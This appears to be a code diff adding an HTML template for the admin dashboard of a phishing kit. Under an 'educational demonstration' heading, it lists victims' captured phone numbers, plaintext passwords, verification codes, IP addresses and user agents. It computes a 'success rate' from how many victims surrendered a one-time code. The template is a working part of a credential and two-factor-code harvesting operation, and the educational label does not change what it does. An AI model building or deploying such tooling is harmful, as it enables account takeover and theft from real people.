@@ -1,0 +1,100 @@
+{% extends 'base.html' %}
+
+{% block title %}Admin Dashboard{% endblock %}
+
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/admin.css') }}">
+{% endblock %}
+
+{% block content %}
+<div class="admin-container">
+    <div class="admin-header">
+        <h1>Educational Phishing Demonstration Dashboard</h1>
+        <p class="subtitle">Monitor demonstration results for educational purposes only</p>
+    </div>
+    
+    <div class="stats-container">
+        <div class="stat-box">
+            <h3>Total Attempts</h3>
+            <div class="stat-value" id="total-attempts">{{ captured_data|length }}</div>
+        </div>
+        <div class="stat-box">
+            <h3>Unique Visitors</h3>
+            <div class="stat-value" id="unique-visitors">{{ captured_data|map(attribute='ip_address')|unique|list|length }}</div>
+        </div>
+        <div class="stat-box">
+            <h3>Success Rate</h3>
+            <div class="stat-value" id="success-rate">
+                {% if captured_data|length > 0 %}
+                    {{ ((captured_data|selectattr('verification_code', 'defined')|list|length / captured_data|length) * 100)|round }}%
+                {% else %}
+                    0%
+                {% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <div class="data-container">
+        <h2>Captured Data</h2>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Phone</th>
+                        <th>Password</th>
+                        <th>Verification Code</th>
+                        <th>IP Address</th>
+                        <th>User Agent</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for entry in captured_data %}
+                    <tr>
+                        <td>{{ entry.timestamp }}</td>
+                        <td>{{ entry.phone if entry.phone is defined else '-' }}</td>
+                        <td>{{ entry.password if entry.password is defined else '-' }}</td>
+                        <td>{{ entry.verification_code if entry.verification_code is defined else '-' }}</td>
+                        <td>{{ entry.ip_address }}</td>
+                        <td class="user-agent">{{ entry.user_agent }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <button id="clear-data" class="btn btn-danger">Clear All Data</button>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Refresh stats periodically
+        setInterval(function() {
+            fetch('/api/stats')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('total-attempts').textContent = data.total_attempts;
+                    document.getElementById('unique-visitors').textContent = data.unique_visitors;
+                    
+                    // Calculate success rate
+                    const successRate = data.total_attempts > 0 
+                        ? Math.round((data.recent_attempts.filter(a => a.verification_code).length / data.total_attempts) * 100) 
+                        : 0;
+                    document.getElementById('success-rate').textContent = successRate + '%';
+                });
+        }, 5000);
+        
+        // Clear data button
+        document.getElementById('clear-data').addEventListener('click', function() {
+            if (confirm('Are you sure you want to clear all captured data? This action cannot be undone.')) {
+                // In a real implementation, this would make an API call to clear the data
+                alert('This is a demonstration. In a real implementation, this would clear the data.');
+            }
+        });
+    });
+</script>
+{% endblock %}
+
